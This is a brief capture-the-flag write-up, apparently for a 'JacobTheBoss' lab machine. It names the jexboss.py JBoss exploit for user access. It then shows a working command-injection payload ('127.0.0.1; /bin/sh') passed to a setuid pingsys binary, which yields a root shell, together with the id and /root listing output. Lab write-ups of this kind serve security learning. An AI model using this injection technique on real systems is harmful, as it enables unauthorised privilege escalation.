
# User

1. Jboss exploit // jexboss.py 

# Root

2. pingsys

```bash
[jacob@jacobtheboss ~]$ /usr/bin/pingsys '127.0.0.1; /bin/sh'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.039 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.037 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.024/0.035/0.041/0.007 ms
sh-4.2# id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
sh-4.2# cd /root/
sh-4.2# ls
anaconda-ks.cfg  jboss.sh  original-ks.cfg  root.txt

```